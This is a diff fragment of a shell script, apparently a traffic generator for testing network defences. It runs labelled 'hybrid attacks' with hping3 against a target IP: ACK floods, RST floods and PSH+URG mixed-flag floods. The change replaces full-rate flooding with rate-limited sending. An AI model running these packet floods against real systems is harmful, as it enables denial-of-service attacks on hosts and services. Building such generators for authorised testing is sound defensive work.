@@ -25,7 +25,7 @@ echo ""
 
 # Hybrid Attack 1: ACK flood with unusual packet sizes
 echo "[Attack 1/5] ACK Flood with variable packet sizes (10 sec)..."
-sudo hping3 -A -p 8080 --flood $TARGET_IP &
+sudo hping3 -A -p 8080 -i u5000 "$TARGET_IP" &
 PID1=$!
 sleep 10
 kill -9 $PID1 2>/dev/null
@@ -35,7 +35,7 @@ sleep 2
 
 # Hybrid Attack 2: RST flood (connection reset attacks)
 echo "[Attack 2/5] RST Flood - Connection Reset attacks (8 sec)..."
-sudo hping3 -R --flood -p 443 $TARGET_IP &
+sudo hping3 -R -i u5000 -p 443 "$TARGET_IP" &
 PID2=$!
 sleep 8
 kill -9 $PID2 2>/dev/null
@@ -55,7 +55,7 @@ sleep 2
 
 # Hybrid Attack 4: Mixed flag combinations (PSH+URG)
 echo "[Attack 4/5] Mixed flag attack - PSH+URG combinations (10 sec)..."
-sudo hping3 -P -U -p 9000-9010 --flood $TARGET_IP &
+sudo hping3 -P -U -p 9000-9010 -i u5000 "$TARGET_IP" &
 PID4=$!
 sleep 10
 kill -9 $PID4 2>/dev/null
